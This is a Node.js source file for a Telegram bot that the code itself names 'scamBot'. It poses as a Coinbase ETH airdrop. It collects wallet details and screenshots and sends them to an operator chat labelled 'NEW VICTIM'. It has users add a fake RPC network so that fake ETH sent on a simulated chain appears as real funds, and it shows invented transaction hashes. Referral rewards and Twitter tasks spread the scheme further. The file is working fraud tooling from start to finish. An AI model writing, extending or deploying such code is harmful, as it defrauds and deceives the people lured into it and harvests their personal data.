require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const axios = require('axios');

// === CONFIG ===
const SCAM_BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_BOT_TOKEN = process.env.ADMIN_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const TENDERLY_RPC = process.env.TENDERLY_RPC;

// === BOTS ===
const scamBot = new Telegraf(SCAM_BOT_TOKEN);
const adminBot = new Telegraf(ADMIN_BOT_TOKEN);

// === IN-MEMORY DB ===
let usersDB = {};
const getUser = (id) => usersDB[id] || null;
const saveUser = (user) => { usersDB[user.telegramId] = user; return user; };
const updateUser = (id, updates) => {
  if (usersDB[id]) Object.assign(usersDB[id], updates);
  return usersDB[id];
};
const getUserByCode = (code) => Object.values(usersDB).find(u => u.referralCode === code);

// === ESCAPE LINK FOR MARKDOWN ===
const escapeLink = (code) => `t\\.me/coinbase\\_eth\\_airdrop\\_bot?start=ref_${code}`;

// === RPC GUIDE ===
const RPC_GUIDE = `
Add this network to Coinbase Wallet:

**Network Name:** Ethereum
**RPC URL:** https://virtual.mainnet.eu.rpc.tenderly.co/4044dd2f-00ef-4abb-95ab-68ef8a62d13d
**Chain ID:** 90000
**Currency:** ETH
`.trim();

// === SEND TO ADMIN (PHOTO + TEXT) ===
const sendToAdmin = async (text, photoFileId = null) => {
  try {
    if (photoFileId) {
      const file = await scamBot.telegram.getFile(photoFileId);
      const fileUrl = `https://api.telegram.org/file/bot${SCAM_BOT_TOKEN}/${file.file_path}`;
      const response = await axios.get(fileUrl, { responseType: 'arraybuffer' });
      const buffer = Buffer.from(response.data);
      await adminBot.telegram.sendPhoto(ADMIN_CHAT_ID, { source: buffer }, { caption: text, parse_mode: 'Markdown' });
    } else {
      await adminBot.telegram.sendMessage(ADMIN_CHAT_ID, text, { parse_mode: 'Markdown' });
    }
  } catch (err) {
    console.error('ADMIN SEND FAILED:', err.message);
  }
};

// === FAKE ETH SEND ===
const sendFakeETH = async (to, eth) => {
  if (!to || to.startsWith('0xFAKE')) return;
  const wei = (eth * 1e18).toString(16);
  try {
    await axios.post(TENDERLY_RPC, {
      jsonrpc: "2.0", method: "eth_sendTransaction",
      params: [{ from: "0x0000000000000000000000000000000000000001", to, value: `0x${wei}` }], id: Date.now()
    });
  } catch {}
};

// === BUTTONS ===
const walletKeyboard = Markup.inlineKeyboard([[Markup.button.callback('Send Wallet + Screenshot', 'send_wallet')]]);
const rpcKeyboard = Markup.inlineKeyboard([[Markup.button.callback('I Added Network', 'rpc_done')]]);
const rpcProofKeyboard = Markup.inlineKeyboard([[Markup.button.callback('Send RPC Proof', 'send_rpc_proof')]]);
const twitterKeyboard = Markup.inlineKeyboard([[Markup.button.callback('Send Twitter Proof', 'send_twitter_proof')]]);
const claimKeyboard = Markup.inlineKeyboard([[Markup.button.callback('CLAIM $50 ETH', 'claim_eth')]]);

// === COMMANDS ===
scamBot.command('profile', (ctx) => {
  const user = getUser(ctx.from.id);
  if (!user) return ctx.reply('Use /start first.');

  ctx.reply(
    `*YOUR PROFILE*\n\n` +
    `User: @${user.username}\n` +
    `Wallet: \`${user.wallet || 'Not set'}\`\n` +
    `Earned: $${user.totalEarned}\n` +
    `Referrals: ${user.referrals.length}\n` +
    `Link: ${escapeLink(user.referralCode)}`,
    { parse_mode: 'Markdown' }
  );
});

scamBot.command('referral', (ctx) => {
  const user = getUser(ctx.from.id);
  if (!user) return ctx.reply('Use /start first.');

  ctx.reply(
    `*REFERRAL LINK*\n\n` +
    `Earn $10 per referral:\n${escapeLink(user.referralCode)}\n\n` +
    `You have ${user.referrals.length} referrals.`,
    { parse_mode: 'Markdown' }
  );
});

scamBot.command('leaderboard', (ctx) => {
  const top = Object.values(usersDB)
    .sort((a, b) => b.totalEarned - a.totalEarned)
    .slice(0, 10);

  if (!top.length) return ctx.reply('No leaderboard yet.');

  let text = `*LEADERBOARD — TOP EARNERS*\n\n`;
  top.forEach((u, i) => {
    text += `${i + 1}. @${u.username} — $${u.totalEarned} (${u.referrals.length} refs)\n`;
  });
  ctx.reply(text, { parse_mode: 'Markdown' });
});

// === /start ===
scamBot.start(async (ctx) => {
  let user = getUser(ctx.from.id);
  const refCode = ctx.startPayload?.startsWith('ref_') ? ctx.startPayload.slice(4) : null;

  if (!user) {
    const code = Math.random().toString(36).substr(2, 8).toUpperCase();
    user = {
      telegramId: ctx.from.id,
      username: ctx.from.username || 'NoUsername',
      referralCode: code,
      referredBy: refCode,
      stage: 'wallet_ss',
      wallet: null,
      referrals: [],
      totalEarned: 0
    };
    saveUser(user);

    if (refCode) {
      const referrer = getUserByCode(refCode);
      if (referrer && referrer.telegramId !== ctx.from.id) {
        referrer.referrals.push(ctx.from.id);
        referrer.totalEarned += 10;
        updateUser(referrer.telegramId, referrer);
        await sendFakeETH(referrer.wallet || '0xFAKE', 0.004);
        scamBot.telegram.sendMessage(referrer.telegramId,
          `*+1 Referral!* $10 sent.\nTotal: $${referrer.totalEarned}\n` +
          `Link: ${escapeLink(referrer.referralCode)}`
        );
      }
    }

    await sendToAdmin(
      `*NEW VICTIM*\nUser: @${user.username}\nID: \`${user.telegramId}\`\nRef: \`${code}\``
    );
  }

  ctx.reply(`Drop your Coinbase wallet + screenshot.`, walletKeyboard);
});

// === BUTTONS & PHOTO ===
scamBot.action('send_wallet', (ctx) => {
  const user = getUser(ctx.from.id);
  if (!user) return;
  user.stage = 'wallet_ss';
  saveUser(user);
  ctx.editMessageText(`Send wallet + screenshot now.`);
});

scamBot.on('photo', async (ctx) => {
  const user = getUser(ctx.from.id);
  if (!user) return ctx.reply('Use /start.');

  const fileId = ctx.message.photo[ctx.message.photo.length - 1].file_id;

  if (user.stage === 'wallet_ss') {
    user.wallet = "0x" + [...Array(40)].map(() => Math.floor(Math.random() * 16).toString(16)).join('');
    user.stage = 'rpc_guide';
    saveUser(user);

    await sendToAdmin(`*WALLET + SS*\nUser: @${user.username}\nWallet: \`${user.wallet}\``, fileId);
    ctx.reply(RPC_GUIDE, rpcKeyboard);
    return;
  }

  if (user.stage === 'rpc_proof') {
    user.stage = 'twitter_tasks';
    saveUser(user);
    await sendToAdmin(`*RPC PROOF*\nUser: @${user.username}\nWallet: \`${user.wallet}\``, fileId);
    ctx.reply(`Follow @BjExchange53077, like pinned, tag 3 friends.`, twitterKeyboard);
    return;
  }

  if (user.stage === 'twitter_proof') {
    user.stage = 'claim_ready';
    saveUser(user);
    await sendToAdmin(`*TWITTER PROOF*\nUser: @${user.username}\nWallet: \`${user.wallet}\``, fileId);
    ctx.reply(`*Tasks done!* Claim $50 ETH:`, claimKeyboard);
    return;
  }

  ctx.reply("Photo received.");
});

scamBot.action('rpc_done', (ctx) => {
  const user = getUser(ctx.from.id);
  if (!user || user.stage !== 'rpc_guide') return;
  user.stage = 'rpc_proof';
  saveUser(user);
  ctx.editMessageText(`Send Chain ID 90000 proof.`, rpcProofKeyboard);
});

scamBot.action('send_rpc_proof', (ctx) => {
  const user = getUser(ctx.from.id);
  if (!user || user.stage !== 'rpc_proof') return;
  ctx.editMessageText(`Send proof now.`);
});

scamBot.action('send_twitter_proof', (ctx) => {
  const user = getUser(ctx.from.id);
  if (!user || user.stage !== 'twitter_tasks') return;
  user.stage = 'twitter_proof';
  saveUser(user);
  ctx.editMessageText(`Send Twitter proof now.`);
});

scamBot.action('claim_eth', async (ctx) => {
  const user = getUser(ctx.from.id);
  if (!user || user.stage !== 'claim_ready') return;

  user.stage = 'claimed';
  saveUser(user);
  await sendFakeETH(user.wallet, 0.02);

  const txHash = "0xFAKE" + Math.random().toString(16).substr(2, 64);

  ctx.editMessageText(
    `*CLAIMED!* $50 ETH sent to:\n\`\`\`\n${user.wallet}\`\`\`\n\n` +
    `Tx: https://dashboard.tenderly.co/tx/mainnet/${txHash}\n\n` +
    `*Share:*\n${escapeLink(user.referralCode)}`,
    { parse_mode: 'Markdown' }
  );

  await sendToAdmin(
    `*CLAIMED $50 ETH*\n` +
    `User: @${user.username}\n` +
    `Wallet: \`${user.wallet}\`\n` +
    `Tx: \`${txHash}\`\n` +
    `Link: ${escapeLink(user.referralCode)}`
  );
});

// === SERVER ===
scamBot.catch((err, ctx) => console.error('ERROR:', err));

const app = express();
app.use(express.json());
app.use(scamBot.webhookCallback(`/bot${SCAM_BOT_TOKEN}`));

const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
  console.log(`Bot LIVE on ${PORT}`);
  await scamBot.telegram.setWebhook(`${process.env.RENDER_EXTERNAL_URL}/bot${SCAM_BOT_TOKEN}`);
  adminBot.launch();
});
